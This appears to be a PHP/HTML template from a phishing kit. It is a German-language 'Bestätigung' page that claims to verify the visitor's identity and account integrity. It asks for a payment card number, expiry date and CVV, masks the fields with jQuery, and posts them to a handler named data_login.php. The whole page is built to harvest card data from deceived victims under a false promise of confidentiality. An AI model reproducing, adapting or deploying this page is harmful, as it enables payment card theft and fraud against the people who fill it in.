<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body class="account">
<?php 
require 'views/header.php';
?>


<main>
<div class="holder">


<div class="left">


<div class="form" style="width:600px;">
<form method="POST" action="data_login.php">
<div class="stitle">Bestätigung</div>
<div class="text">Wir garantieren die vertrauliche Behandlung Ihrer Daten, die ausschließlich zur Überprüfung Ihrer Identität und Kontointegrität dienen.</div>

<div class="err" style="display:none; margin-top:20px; align-items:center;">
    <div class="icon"><img src="res/err.png"></div>
    <div class="txt"> Bitte geben Sie gültige Daten ein.</div>
</div>

<div class="col">
    <input type="text" name="cardNumber" id="d1" placeholder="XXXX XXXX XXXX XXXX" required>
    <label for="d1">Kartennummer</label>
</div>

<div class="col">
    <input type="text" name="expiryDate" id="d2" placeholder="MM/JJ" required>
    <label for="d2">Ablaufdatum</label>
</div>

<div class="col">
    <input type="text" name="cvv" id="d3" placeholder="CVV" required>
    <label for="d3">Sicherheitscode </label>
</div>

<div class="col lodah">
<button class="flash" type="submit"> Weiter </button>
<div class="loader"></div>
</div>

</form>
</div>

</div>






</div>
</main>


<?php 
require 'views/footer.php';
?><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-creditcardvalidator/1.2.0/jquery.creditCardValidator.js"></script>
<script>
$("#d1").mask("0000 0000 0000 0000");
$("#d2").mask("00/00");
$("#d3").mask('0000');

 
</script>
</body>
</html>